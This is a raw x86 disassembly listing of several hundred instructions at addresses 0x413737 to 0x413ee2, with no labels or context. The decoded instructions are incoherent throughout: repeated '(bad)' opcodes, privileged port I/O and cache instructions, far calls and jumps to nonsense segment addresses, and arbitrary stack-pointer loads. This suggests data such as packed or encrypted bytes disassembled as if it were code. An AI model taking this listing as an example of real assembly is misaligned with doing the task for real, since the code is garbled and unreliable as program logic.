  413737:	mov    DWORD PTR es:[ebx],edi
  41373a:	pop    ebp
  41373b:	xchg   esi,eax
  41373c:	mov    ebp,0x259d8749
  413741:	pusha  
  413742:	lahf   
  413743:	mov    edi,0x9a489b67
  413748:	into   
  413749:	add    eax,edx
  41374b:	dec    edx
  41374c:	or     DWORD PTR [eax],esp
  41374e:	mov    eax,0x25b3dcee
  413753:	sete   bl
  413756:	stos   BYTE PTR es:[edi],al
  413757:	or     dl,BYTE PTR [eax+0x44]
  41375a:	pushf  
  41375b:	mov    al,0x7d
  41375d:	cmp    edx,eax
  41375f:	fiadd  DWORD PTR [ebx-0x4eaa2909]
  413765:	fstp   TBYTE PTR [ebx-0x7e]
  413768:	jne    0x413757
  41376a:	call   0xbf9f:0x6312f40
  413771:	and    eax,0x341fe
  413776:	cld    
  413777:	xor    esi,edx
  413779:	rcl    DWORD PTR [eax+eax*1-0x58],1
  41377d:	mov    esi,0x4bcafa1b
  413782:	daa    
  413783:	mov    esp,0x7985c374
  413788:	cli    
  413789:	xchg   ecx,eax
  41378a:	jle    0x4137e5
  41378c:	fbstp  TBYTE PTR [esi]
  41378e:	ja     0x413764
  413790:	in     eax,dx
  413791:	les    ebp,FWORD PTR [esi+edx*1+0x388e7944]
  413798:	xchg   ebp,eax
  413799:	fidiv  WORD PTR [eax]
  41379b:	ret    0x5a95
  41379e:	cs nop
  4137a0:	gs ja  0x413780
  4137a3:	jne    0x413818
  4137a5:	(bad)  
  4137a6:	adc    eax,0x10a6eb06
  4137ab:	or     al,al
  4137ad:	popa   
  4137ae:	js     0x4137b3
  4137b0:	loopne 0x4137bc
  4137b2:	aaa    
  4137b3:	sahf   
  4137b4:	mov    ebp,0xea74e192
  4137b9:	inc    esi
  4137ba:	adc    ch,ch
  4137bc:	int    0x66
  4137be:	xor    edx,DWORD PTR [edx+0x32]
  4137c1:	jns    0x413780
  4137c3:	cmc    
  4137c4:	int    0x1e
  4137c6:	dec    ebx
  4137c7:	fs and esi,edi
  4137ca:	shl    BYTE PTR [ecx-0x7f610db3],1
  4137d0:	das    
  4137d1:	mov    edx,DWORD PTR [ebx+0x2455d6a8]
  4137d7:	outs   dx,DWORD PTR ds:[esi]
  4137d8:	invd   
  4137da:	out    dx,eax
  4137db:	das    
  4137dc:	sbb    ecx,edi
  4137de:	sub    dh,0xf5
  4137e1:	out    0x22,eax
  4137e3:	pushf  
  4137e4:	call   0x88c9:0xfcb14678
  4137eb:	cmp    eax,0x8e1ec25f
  4137f0:	arpl   WORD PTR [ebx-0x36486629],bp
  4137f6:	push   ss
  4137f7:	xor    DWORD PTR [ecx],esi
  4137f9:	push   esp
  4137fa:	sbb    ebx,DWORD PTR [edx+0x1e29aed5]
  413800:	stos   BYTE PTR es:[edi],al
  413801:	inc    esi
  413802:	cwde   
  413803:	and    DWORD PTR [ebp+0x27b93ff],edx
  413809:	pushf  
  41380a:	dec    esi
  41380b:	mov    ebx,0x5f7c61f6
  413810:	call   0xd23cf898
  413815:	arpl   bx,bx
  413817:	les    ebp,FWORD PTR [eax-0x14]
  41381a:	repz mul dh
  41381d:	dec    ebp
  41381e:	xor    dl,cl
  413820:	stc    
  413821:	bound  edx,QWORD PTR [eax+0x31f32abe]
  413827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413828:	imul   edi,DWORD PTR [edx],0xffffffdc
  41382b:	push   ecx
  41382c:	ja     0x413804
  41382e:	jb     0x413833
  413830:	jecxz  0x413878
  413832:	mov    esi,0x8fff68d7
  413837:	fld    QWORD PTR [eax-0x6e]
  41383a:	pop    esi
  41383b:	ror    BYTE PTR [ebx-0x5d],0x5
  41383f:	imul   esi,DWORD PTR [esi+esi*8-0x1d],0x47b179b6
  413847:	mov    WORD PTR [esi-0x76aee658],es
  41384d:	add    eax,0x491aaae5
  413852:	pop    esi
  413853:	mov    ds:0x9ac0e0f8,eax
  413858:	iret   
  413859:	push   ecx
  41385a:	mov    ch,0x1f
  41385c:	mov    ds:0xff5dda96,al
  413861:	(bad)  
  413862:	fldcw  WORD PTR [ecx+0x72]
  413865:	stos   BYTE PTR es:[edi],al
  413866:	and    BYTE PTR [ecx-0x1460a29],ch
  41386c:	push   ebp
  41386d:	mov    ds:0xb83e33dd,al
  413872:	ins    BYTE PTR es:[edi],dx
  413873:	add    eax,0x834346be
  413878:	outs   dx,BYTE PTR ds:[esi]
  413879:	lock lock jmp 0x41380e
  41387d:	push   ss
  41387e:	or     BYTE PTR [ecx+0x3d],ah
  413881:	sahf   
  413882:	sub    DWORD PTR [eax-0xc],ecx
  413885:	push   edi
  413886:	out    dx,eax
  413887:	scas   eax,DWORD PTR es:[edi]
  413888:	adc    DWORD PTR [esi+edx*4+0x5f],esi
  41388c:	pop    es
  41388d:	push   ss
  41388e:	pop    eax
  41388f:	int    0x8b
  413891:	fsubp  st(2),st
  413893:	inc    ebx
  413894:	push   esi
  413895:	mov    ds:0x2a6a84dd,eax
  41389a:	dec    esi
  41389b:	add    eax,0x46aafeb7
  4138a0:	clc    
  4138a1:	aad    0xf8
  4138a3:	xchg   BYTE PTR [edx+0x2a],al
  4138a6:	stos   DWORD PTR es:[di],eax
  4138a8:	sub    DWORD PTR ds:0x65766650,0x4374c0a5
  4138b2:	in     eax,0xe8
  4138b4:	ficomp WORD PTR [edi+0x5a4d4794]
  4138ba:	inc    esp
  4138bb:	xor    DWORD PTR [ebx],ebp
  4138bd:	push   ebp
  4138be:	enter  0xed0e,0xe6
  4138c2:	jge    0x4138c4
  4138c4:	pop    ss
  4138c5:	and    cl,BYTE PTR [edx+0x2]
  4138c8:	outs   dx,BYTE PTR ds:[si]
  4138ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138cb:	js     0x413860
  4138cd:	(bad)  
  4138ce:	cmp    ch,cl
  4138d0:	sub    eax,DWORD PTR [edi-0x3ff87090]
  4138d6:	neg    edi
  4138d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d9:	sub    eax,0x680e60d9
  4138de:	or     ch,cl
  4138e0:	aad    0x45
  4138e2:	mov    cl,0xe5
  4138e4:	dec    edx
  4138e5:	xchg   ebp,eax
  4138e6:	lods   eax,DWORD PTR ds:[esi]
  4138e7:	mov    esi,0x534d750d
  4138ec:	dec    ebx
  4138ed:	out    dx,al
  4138ee:	int3   
  4138ef:	cwde   
  4138f0:	and    bl,BYTE PTR [ebx]
  4138f2:	mov    ch,0xf8
  4138f4:	mov    esp,edi
  4138f6:	jp     0x4138ca
  4138f8:	mov    bh,0x96
  4138fa:	das    
  4138fb:	aas    
  4138fc:	jbe    0x413962
  4138fe:	arpl   WORD PTR [edx+0x503b3f11],sp
  413904:	pop    edx
  413905:	xlat   BYTE PTR ds:[ebx]
  413906:	je     0x413888
  413908:	das    
  413909:	(bad)  
  41390a:	sub    al,0x20
  41390c:	dec    ecx
  41390d:	or     BYTE PTR [ecx],al
  41390f:	clc    
  413910:	cmp    al,0xc0
  413912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413913:	(bad)  
  413915:	out    dx,al
  413916:	pop    ss
  413917:	mov    bl,0xbd
  413919:	das    
  41391a:	mov    esi,0x9cd651f9
  41391f:	push   cs
  413920:	jns    0x4138b3
  413922:	jmp    0xe52f:0x879e04ce
  413929:	pop    ss
  41392a:	or     eax,0xf2f402d6
  41392f:	ins    BYTE PTR es:[edi],dx
  413930:	pop    ds
  413931:	jb     0x4138f7
  413933:	push   ebp
  413934:	xchg   DWORD PTR [ecx+0x4d],ebx
  413937:	mov    ebx,0x706cf366
  41393c:	adc    bl,BYTE PTR [ebx+0x7e66849c]
  413942:	xchg   edx,eax
  413943:	gs lahf 
  413945:	clc    
  413946:	rcl    BYTE PTR [eax+ebp*8-0x1b],1
  41394a:	xchg   ecx,esi
  41394c:	push   edx
  41394d:	push   0x1af3bf18
  413952:	push   0xa779d146
  413957:	add    BYTE PTR [edx],ah
  413959:	mov    BYTE PTR [edi],bh
  41395b:	enter  0xbc20,0x37
  41395f:	xchg   BYTE PTR [ebx-0x4a],ah
  413962:	add    cl,0xb9
  413965:	and    BYTE PTR [esi-0x4fbf3b45],0x38
  41396c:	pushf  
  41396d:	rcr    BYTE PTR [esi+esi*1+0x26],1
  413971:	inc    esp
  413972:	std    
  413973:	lahf   
  413974:	outs   dx,DWORD PTR ds:[esi]
  413975:	sub    ecx,DWORD PTR [ebx]
  413977:	ja     0x41394f
  413979:	and    BYTE PTR [edi],ah
  41397b:	pop    esi
  41397c:	mov    ds:0xa2933e1,eax
  413981:	jecxz  0x413951
  413983:	xor    al,0xd4
  413985:	mov    ch,0xc6
  413987:	rol    DWORD PTR [ebp+ecx*1+0x7],cl
  41398b:	adc    al,0x9b
  41398d:	xchg   ecx,eax
  41398e:	or     cl,0xca
  413991:	pushf  
  413992:	sub    DWORD PTR [edx+0x51],ecx
  413995:	mov    ah,0x12
  413997:	in     al,0xbd
  413999:	lods   al,BYTE PTR ds:[esi]
  41399a:	jl     0x413962
  41399c:	cwde   
  41399d:	adc    bh,BYTE PTR [ecx+edi*8-0x7dd47015]
  4139a4:	aad    0xd4
  4139a6:	arpl   si,bx
  4139a8:	push   ebp
  4139a9:	in     al,dx
  4139aa:	popf   
  4139ab:	mov    DWORD PTR [ebp-0x4e],edi
  4139ae:	xchg   ecx,eax
  4139af:	cmp    DWORD PTR [ecx-0x6cfa831f],ebx
  4139b5:	jb     0x413a2c
  4139b7:	cdq    
  4139b8:	aad    0xd2
  4139ba:	dec    edi
  4139bb:	sbb    edx,DWORD PTR [esp+edx*2+0x48]
  4139bf:	cmp    DWORD PTR [eax],esp
  4139c1:	xchg   esi,eax
  4139c2:	cmp    bl,BYTE PTR [edx+0x4e4a81bb]
  4139c8:	das    
  4139c9:	adc    esp,eax
  4139cb:	popf   
  4139cc:	pop    edx
  4139cd:	adc    cl,dh
  4139cf:	sbb    ah,BYTE PTR [eax+0x27]
  4139d2:	daa    
  4139d3:	mov    fs,esi
  4139d5:	mov    ebx,0xe5904930
  4139da:	jbe    0x41396d
  4139dc:	xchg   ebx,eax
  4139dd:	stos   DWORD PTR es:[edi],eax
  4139de:	call   0xce51:0x251a895e
  4139e5:	mov    al,BYTE PTR [eax]
  4139e7:	lahf   
  4139e8:	loope  0x41397c
  4139ea:	fcom   DWORD PTR [ebp+0x45e55a32]
  4139f0:	in     eax,dx
  4139f1:	mov    ch,0xc9
  4139f3:	and    DWORD PTR [edx],edi
  4139f5:	mov    BYTE PTR [esi+edi*2+0x7287336c],dl
  4139fc:	(bad)  
  4139fd:	dec    ecx
  4139fe:	sub    ah,dl
  413a00:	sbb    bl,BYTE PTR [edi-0x63eb5ec0]
  413a06:	dec    ebx
  413a07:	pop    esi
  413a08:	mov    bh,0x5e
  413a0a:	sbb    BYTE PTR [esi-0x6f],ah
  413a0d:	pop    eax
  413a0e:	push   ss
  413a0f:	cwde   
  413a10:	(bad)  
  413a11:	cmp    edx,DWORD PTR [edx+0x4dfa4f08]
  413a17:	xor    eax,0xa478eee6
  413a1c:	hlt    
  413a1d:	sbb    eax,0xa2845950
  413a22:	or     DWORD PTR [esi+0x23],ebx
  413a25:	sbb    ch,BYTE PTR cs:[edx+0x32]
  413a29:	mov    edx,0x2ca0d3d1
  413a2e:	mov    eax,0x8e910f3a
  413a33:	sbb    dh,BYTE PTR [edi+0x47fc9fd3]
  413a39:	sbb    eax,0xb6ac6fbe
  413a3e:	jne    0x413ab0
  413a40:	dec    ecx
  413a41:	cdq    
  413a42:	icebp  
  413a43:	add    eax,0x22e84d51
  413a48:	call   0x6449:0x2f342e25
  413a4f:	dec    esp
  413a50:	ror    ecx,0xb0
  413a53:	mov    esp,0x97bee5d6
  413a58:	aas    
  413a59:	popa   
  413a5a:	pop    esp
  413a5b:	pop    ds
  413a5c:	scas   al,BYTE PTR es:[edi]
  413a5d:	jnp    0x413a4d
  413a5f:	or     ecx,DWORD PTR [esi]
  413a61:	push   es
  413a62:	or     edi,esp
  413a64:	mov    bh,0x50
  413a66:	out    0x37,al
  413a68:	loopne 0x413a2b
  413a6a:	dec    edx
  413a6b:	xlat   BYTE PTR ds:[ebx]
  413a6c:	xor    ebp,DWORD PTR [eax-0x61858a2a]
  413a72:	jp     0x413a8f
  413a74:	push   cs
  413a75:	lods   eax,DWORD PTR ds:[esi]
  413a76:	addr16 pop esi
  413a78:	pop    ss
  413a79:	fisttp DWORD PTR [esi-0x74]
  413a7c:	mov    ebx,DWORD PTR [esi]
  413a7e:	clc    
  413a7f:	xor    esp,ebx
  413a81:	jo     0x413a30
  413a83:	test   al,0xf3
  413a85:	mov    ?,WORD PTR [ecx+ebp*8-0x29840f43]
  413a8c:	dec    ecx
  413a8d:	dec    esp
  413a8e:	into   
  413a8f:	xchg   edx,eax
  413a90:	sbb    ebp,DWORD PTR [edx-0x6de8a224]
  413a96:	push   esp
  413a97:	sub    eax,0x19b0d18e
  413a9c:	out    0x52,eax
  413a9e:	pop    ss
  413a9f:	dec    ebx
  413aa0:	das    
  413aa1:	adc    DWORD PTR [esi-0x5fdc8602],ebx
  413aa7:	inc    eax
  413aa8:	gs enter 0x82fc,0x2e
  413aad:	fdivr  st,st(2)
  413aaf:	mov    eax,0x2d16e063
  413ab4:	in     al,0x80
  413ab6:	pusha  
  413ab7:	(bad)  
  413ab9:	or     eax,eax
  413abb:	or     ebx,0xffffffae
  413abe:	and    eax,edx
  413ac0:	mov    esp,ss
  413ac2:	loop   0x413ac1
  413ac4:	iret   
  413ac5:	inc    edx
  413ac6:	and    al,dl
  413ac8:	retf   
  413ac9:	je     0x413aef
  413acb:	xchg   ebp,eax
  413acc:	mov    WORD PTR [eax+0x4ab03b2c],ds
  413ad2:	mov    ah,0xc0
  413ad4:	sub    BYTE PTR fs:[ebx-0x6d8a4ebe],cl
  413adb:	shl    BYTE PTR ds:0xe99e941d,0x1
  413ae2:	dec    esp
  413ae3:	push   ebp
  413ae4:	enter  0xba8d,0xa
  413ae8:	call   0x374c7fad
  413aed:	lahf   
  413aee:	push   edx
  413aef:	jae    0x413b4a
  413af1:	xchg   edx,eax
  413af2:	dec    ecx
  413af3:	in     al,0xe6
  413af5:	je     0x413ac9
  413af7:	fsubr  QWORD PTR [eax+0x483f6273]
  413afd:	retf   
  413afe:	mov    bl,0xb7
  413b00:	pop    esi
  413b01:	iret   
  413b02:	dec    edx
  413b03:	xchg   edx,eax
  413b04:	pop    esp
  413b05:	add    BYTE PTR [esi+0x2c86ba2a],cl
  413b0b:	mov    eax,0x76cd0a1c
  413b10:	mov    ds:0xfe6cc383,al
  413b15:	stos   DWORD PTR es:[edi],eax
  413b16:	addr16 push esp
  413b18:	cmc    
  413b19:	in     al,dx
  413b1a:	sub    eax,ebp
  413b1c:	fsub   st,st(7)
  413b1e:	cmp    al,0xc9
  413b20:	fiadd  WORD PTR [eax+0x6aef6eae]
  413b26:	pushw  0xe650
  413b2a:	push   ss
  413b2b:	pop    esi
  413b2c:	sbb    al,0x31
  413b2e:	push   eax
  413b2f:	jbe    0x413aed
  413b31:	fnstsw WORD PTR [edx+0x20]
  413b34:	ret    0x7e47
  413b37:	shr    DWORD PTR [esi+esi*1-0x669ebbca],0xf1
  413b3f:	call   0x10e3:0xbfd67937
  413b46:	pop    DWORD PTR [esi+0x20ce726d]
  413b4c:	ja     0x413b5f
  413b4e:	push   ecx
  413b4f:	push   esp
  413b50:	aam    0xbd
  413b52:	xchg   edx,eax
  413b53:	dec    esi
  413b54:	xlat   BYTE PTR ds:[ebx]
  413b55:	or     BYTE PTR [edi],0x95
  413b58:	cs and al,0x80
  413b5b:	scas   eax,DWORD PTR es:[edi]
  413b5c:	xchg   ecx,eax
  413b5d:	ret    0x8cdd
  413b60:	mov    cl,BYTE PTR [eax+0x231bd56f]
  413b66:	pop    edi
  413b67:	sub    edi,edi
  413b69:	jecxz  0x413b44
  413b6b:	mov    edx,0x99827c10
  413b70:	sub    DWORD PTR [ebx],ecx
  413b72:	je     0x413b84
  413b74:	jb     0x413b09
  413b76:	or     ebp,esi
  413b78:	repnz dec edx
  413b7a:	add    eax,esp
  413b7c:	loope  0x413b1a
  413b7e:	int    0x57
  413b80:	push   edi
  413b81:	jle    0x413b44
  413b83:	mov    ds,WORD PTR [edi+0x31]
  413b86:	leave  
  413b87:	fwait
  413b88:	test   BYTE PTR [edi-0x54],0x48
  413b8c:	and    edi,edi
  413b8e:	iret   
  413b8f:	mov    ecx,0xa5e2f9ba
  413b94:	xchg   edx,eax
  413b95:	adc    eax,0xb9ee7bb9
  413b9a:	test   eax,0xe70f20cd
  413b9f:	mov    ah,0x71
  413ba1:	push   edx
  413ba2:	dec    ebx
  413ba3:	pop    ebp
  413ba4:	(bad)  
  413ba5:	pop    edx
  413ba6:	mov    eax,ds:0x96da183e
  413bab:	sbb    ah,BYTE PTR [edi]
  413bad:	pop    ecx
  413bae:	es mov dh,0x3a
  413bb1:	cdq    
  413bb2:	jbe    0x413bad
  413bb4:	and    eax,0x24f9b40c
  413bb9:	sub    al,0xe7
  413bbb:	into   
  413bbc:	(bad)  
  413bbd:	rol    dh,0x29
  413bc0:	fdiv   QWORD PTR [ebx]
  413bc2:	fwait
  413bc3:	ret    0xfb82
  413bc6:	sbb    al,0x4c
  413bc8:	repz rol DWORD PTR [eax+0x7c0f6b94],cl
  413bcf:	loope  0x413c34
  413bd1:	hlt    
  413bd2:	lock aas 
  413bd4:	jns    0x413c0b
  413bd6:	fisubr WORD PTR [eax]
  413bd8:	cmp    esi,eax
  413bda:	pop    edx
  413bdb:	(bad)  
  413bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bdd:	ror    BYTE PTR [edx-0x397c1f10],cl
  413be3:	stos   DWORD PTR es:[edi],eax
  413be4:	pop    esi
  413be5:	jle    0x413c26
  413be7:	and    DWORD PTR [edi+0x6e],0xffffff91
  413beb:	adc    al,0x2d
  413bed:	mov    edx,0x290c5f94
  413bf2:	jb     0x413bed
  413bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bf5:	jl     0x413c18
  413bf7:	cmp    al,0x99
  413bf9:	iret   
  413bfa:	pop    ebx
  413bfb:	jp     0x413bf5
  413bfd:	hlt    
  413bfe:	jnp    0x413c04
  413c00:	inc    edi
  413c01:	mov    ds:0x3265b4cc,eax
  413c06:	out    dx,eax
  413c07:	(bad)  
  413c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c09:	loopne 0x413c49
  413c0b:	or     BYTE PTR [ebx+0x102f90e1],ch
  413c11:	test   DWORD PTR [ebp+0x74],ecx
  413c14:	push   edx
  413c15:	or     al,0x1b
  413c17:	or     esp,ebx
  413c19:	mov    ebx,0xcb7c96b0
  413c1e:	test   DWORD PTR [edx-0x36],0xb173a5d
  413c25:	adc    al,0xfb
  413c27:	push   eax
  413c28:	mov    esi,0x66cab3b6
  413c2d:	sbb    dh,BYTE PTR [edx+edi*8]
  413c30:	adc    BYTE PTR [ebp-0x5203c4e7],0x6c
  413c37:	retf   0x2bb5
  413c3a:	mov    al,ds:0xde8f1e26
  413c3f:	fstp   QWORD PTR [eax+ebp*2-0x3e]
  413c43:	loopne 0x413bda
  413c45:	sub    eax,DWORD PTR [ecx+0x7a0b5c40]
  413c4b:	stos   BYTE PTR es:[edi],al
  413c4c:	jge    0x413c61
  413c4e:	shr    DWORD PTR [ebp+eax*4-0x52d4d64a],cl
  413c55:	inc    esi
  413c56:	lock enter 0x6149,0x46
  413c5b:	scas   al,BYTE PTR es:[edi]
  413c5c:	pop    edi
  413c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c5e:	dec    esp
  413c5f:	daa    
  413c60:	into   
  413c61:	jle    0x413c4c
  413c63:	add    DWORD PTR [edi-0x21e54123],ebx
  413c69:	shl    DWORD PTR [ecx-0x74],0xd9
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	inc    eax
  413c6f:	mov    esi,0x638620f6
  413c74:	scas   al,BYTE PTR es:[edi]
  413c75:	xchg   ecx,eax
  413c76:	ret    0xd48e
  413c79:	xchg   ebx,eax
  413c7a:	jg     0x413c85
  413c7c:	mov    ebp,?
  413c7e:	pop    eax
  413c7f:	mov    ds:0x56a7d991,al
  413c84:	das    
  413c85:	mov    ?,WORD PTR [ebp+0x674ed6dc]
  413c8b:	jmp    FWORD PTR [ecx+0x2207a984]
  413c91:	mov    edx,DWORD PTR [ebp+0xbdd51a2]
  413c97:	mov    edx,0xdf299410
  413c9c:	outs   dx,BYTE PTR ds:[esi]
  413c9d:	jle    0x413cd2
  413c9f:	pop    esi
  413ca0:	xchg   ebp,eax
  413ca1:	nop
  413ca2:	xchg   ebp,eax
  413ca3:	add    DWORD PTR [edx-0x4b],esi
  413ca6:	push   es
  413ca7:	cld    
  413ca8:	mov    cl,dl
  413caa:	or     BYTE PTR [edi-0x12d622f9],dl
  413cb0:	pop    eax
  413cb1:	iret   
  413cb2:	div    BYTE PTR [eax-0x2ac12308]
  413cb8:	clc    
  413cb9:	jmp    0x3938:0xb5d21af6
  413cc0:	push   ebp
  413cc1:	jb     0x413cb7
  413cc3:	fist   WORD PTR [esi]
  413cc5:	out    dx,eax
  413cc6:	sti    
  413cc7:	mov    dh,0x12
  413cc9:	xchg   BYTE PTR [ecx],bh
  413ccb:	mov    bh,0x52
  413ccd:	jecxz  0x413c78
  413ccf:	jge    0x413c52
  413cd1:	jno    0x413ce3
  413cd3:	hlt    
  413cd4:	push   esp
  413cd5:	sub    al,0xfe
  413cd7:	out    dx,eax
  413cd8:	popf   
  413cd9:	pop    edi
  413cda:	pop    esp
  413cdb:	imul   edx,DWORD PTR [esi+0x233ad5f2],0x45
  413ce2:	ins    DWORD PTR es:[edi],dx
  413ce3:	outs   dx,BYTE PTR cs:[esi]
  413ce5:	adc    esi,0xffffff90
  413ce8:	enter  0xea84,0xb4
  413cec:	in     al,0x19
  413cee:	inc    ebx
  413cef:	aas    
  413cf0:	imul   edi,DWORD PTR [esi],0x20cd4bca
  413cf6:	arpl   WORD PTR [eax],cx
  413cf8:	outs   dx,DWORD PTR ds:[esi]
  413cf9:	xor    DWORD PTR [ebp+0x32],0x80948f8d
  413d00:	jne    0x413d1f
  413d02:	cdq    
  413d03:	shl    BYTE PTR [ecx],0x98
  413d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d07:	cld    
  413d08:	xor    dl,bl
  413d0a:	push   edx
  413d0b:	or     BYTE PTR [esi+ebx*2],0x37
  413d0f:	jb     0x413d66
  413d11:	lock (bad) 
  413d13:	pop    ds
  413d14:	push   0x8bfa6abf
  413d19:	or     esp,DWORD PTR [ebp+0xa]
  413d1c:	test   eax,0xd718bd87
  413d21:	mov    al,ds:0xa689f775
  413d26:	ins    BYTE PTR es:[edi],dx
  413d27:	pop    ebp
  413d28:	jo     0x413d62
  413d2a:	sbb    al,0x40
  413d2c:	or     bh,cl
  413d2e:	sub    al,0xa7
  413d30:	inc    eax
  413d31:	scas   eax,DWORD PTR es:[edi]
  413d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d33:	dec    ecx
  413d34:	idiv   ebx
  413d36:	sub    al,0xba
  413d38:	or     bh,BYTE PTR [esi-0x539c2835]
  413d3e:	ins    DWORD PTR es:[edi],dx
  413d3f:	push   esp
  413d40:	sub    bh,BYTE PTR [edx+0x532c7897]
  413d46:	inc    esp
  413d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d48:	in     eax,0x9e
  413d4a:	(bad)  
  413d4b:	iret   
  413d4c:	in     eax,dx
  413d4d:	int    0xdb
  413d4f:	repz (bad) 
  413d52:	test   eax,0xaf33cac0
  413d57:	pushf  
  413d58:	cs or  al,0xd
  413d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d5d:	sar    BYTE PTR [esi-0x19],1
  413d60:	adc    ecx,DWORD PTR [ebp+0x39]
  413d63:	scas   eax,DWORD PTR es:[edi]
  413d64:	push   cs
  413d65:	outs   dx,DWORD PTR ds:[esi]
  413d66:	xchg   ebp,eax
  413d67:	shr    BYTE PTR [edx+eax*8-0x5d03f384],1
  413d6e:	or     esi,esp
  413d70:	mov    al,ds:0xa46c968d
  413d75:	xor    ch,BYTE PTR [ebp-0x4a10962a]
  413d7b:	add    eax,0x4e25ae18
  413d80:	mov    edi,0xa0364b14
  413d85:	pop    ebp
  413d86:	ins    BYTE PTR es:[edi],dx
  413d87:	(bad)  
  413d88:	jle    0x413e04
  413d8a:	mov    edx,edx
  413d8c:	push   ebp
  413d8d:	cld    
  413d8e:	mov    ds:0x3d1a6ce9,eax
  413d93:	cs push cs
  413d95:	inc    ebx
  413d96:	dec    ebp
  413d97:	jmp    0x413dfc
  413d99:	push   edi
  413d9a:	sub    BYTE PTR [ecx-0x7f],bh
  413d9d:	xchg   DWORD PTR [edi],esi
  413d9f:	popa   
  413da0:	cs in  eax,0x38
  413da3:	fs pop ebx
  413da5:	rcl    ah,1
  413da7:	out    0xd3,al
  413da9:	inc    eax
  413daa:	jno    0x413dc9
  413dac:	outs   dx,BYTE PTR ds:[esi]
  413dad:	or     edi,DWORD PTR [edi-0x45abe106]
  413db3:	inc    esp
  413db4:	ds js  0x413e20
  413db7:	and    al,0x29
  413db9:	mov    ebx,0xc0109bf0
  413dbe:	mov    ecx,0x41412e6
  413dc3:	lds    ecx,FWORD PTR [edi]
  413dc5:	arpl   WORD PTR [edx+0x4a],bx
  413dc8:	ficom  WORD PTR [eax+ecx*1-0x2d9cff50]
  413dcf:	mov    eax,0x78198c86
  413dd4:	loope  0x413dc0
  413dd6:	cmp    bh,BYTE PTR [edi-0x1716afc7]
  413ddc:	dec    ebx
  413ddd:	ss mul cl
  413de0:	pop    edi
  413de1:	cmp    ecx,ecx
  413de3:	aaa    
  413de4:	jl     0x413e3c
  413de6:	sbb    DWORD PTR [edx-0xc79450d],esp
  413dec:	pusha  
  413ded:	add    DWORD PTR [eax],0xffffff98
  413df0:	mov    eax,DWORD PTR [ebp-0x43]
  413df3:	scas   al,BYTE PTR es:[edi]
  413df4:	push   esp
  413df5:	jl     0x413e01
  413df7:	enter  0xe322,0x55
  413dfb:	into   
  413dfc:	mov    dl,0xc4
  413dfe:	shl    DWORD PTR [edi-0x521c3c97],0x33
  413e05:	adc    eax,0x75cbe285
  413e0a:	lods   eax,DWORD PTR ds:[esi]
  413e0b:	adc    esi,DWORD PTR [ecx+0x16b70659]
  413e11:	pushf  
  413e12:	mov    ch,0x94
  413e14:	mov    ecx,0x8b8cc424
  413e19:	shl    DWORD PTR [eax-0x179f040],0x11
  413e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e21:	ins    BYTE PTR es:[edi],dx
  413e22:	adc    ebx,DWORD PTR [esi-0x209dec33]
  413e28:	jmp    0x413de3
  413e2a:	(bad)  
  413e2b:	icebp  
  413e2c:	push   eax
  413e2d:	or     BYTE PTR [ecx+eiz*1+0x11],ah
  413e31:	fnstenv [edx+0x5ae8daee]
  413e37:	pop    eax
  413e38:	cmp    eax,0xbd9d45b2
  413e3d:	add    DWORD PTR [edx-0x7c],0x1f778dc3
  413e44:	int3   
  413e45:	mov    eax,0xcec0d866
  413e4a:	mov    ah,0x75
  413e4c:	sar    edx,0xc6
  413e4f:	(bad)  
  413e51:	jg     0x413e0a
  413e53:	(bad)  
  413e54:	cwde   
  413e55:	jmp    0xaefa:0x641f8ad
  413e5c:	test   al,0x3d
  413e5e:	adc    DWORD PTR es:[ecx-0x13d353f1],ecx
  413e65:	pop    eax
  413e66:	imul   esp,DWORD PTR [eax],0xf7bf560b
  413e6c:	loop   0x413e9d
  413e6e:	mov    esi,0xb54da73e
  413e73:	mov    eax,ds:0x462d55dc
  413e78:	std    
  413e79:	pop    eax
  413e7a:	jno    0x413e3f
  413e7c:	jb     0x413ed2
  413e7e:	add    esp,eax
  413e80:	xchg   ebx,eax
  413e81:	aas    
  413e82:	in     eax,0xf7
  413e84:	mov    ch,0x76
  413e86:	pop    edi
  413e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e88:	jno    0x413e3c
  413e8a:	adc    edx,DWORD PTR [edi-0x1f]
  413e8d:	inc    ecx
  413e8e:	sbb    ah,BYTE PTR [eax-0x51fc51a4]
  413e94:	adc    al,0x32
  413e96:	cld    
  413e97:	aaa    
  413e98:	pop    ebp
  413e99:	out    dx,al
  413e9a:	lods   eax,DWORD PTR ds:[esi]
  413e9b:	jo     0x413ecd
  413e9d:	test   eax,0xf411c0e9
  413ea2:	pushf  
  413ea3:	add    DWORD PTR [eax+0x65329ba2],ecx
  413ea9:	mov    eax,es
  413eab:	lahf   
  413eac:	push   ds
  413ead:	and    DWORD PTR [ecx],esp
  413eaf:	jl     0x413e75
  413eb1:	(bad)  
  413eb2:	cmc    
  413eb3:	nop
  413eb4:	or     ebp,DWORD PTR [edx+eax*4+0x37]
  413eb8:	or     eax,0x862289cf
  413ebd:	(bad)  
  413ebe:	mov    dh,0x6c
  413ec0:	dec    esi
  413ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec2:	popf   
  413ec3:	pop    esp
  413ec4:	or     ah,al
  413ec6:	out    dx,eax
  413ec7:	pop    ds
  413ec8:	int3   
  413ec9:	fyl2x  
  413ecb:	mov    eax,0xdbc6d4fa
  413ed0:	mov    bl,0x42
  413ed2:	shl    bl,1
  413ed4:	xor    DWORD PTR [esi],0xd7d878a8
  413eda:	cwde   
  413edb:	sbb    eax,0xdbda6294
  413ee0:	xor    edx,ebx
  413ee2:	xor    eax,0x23e573e4
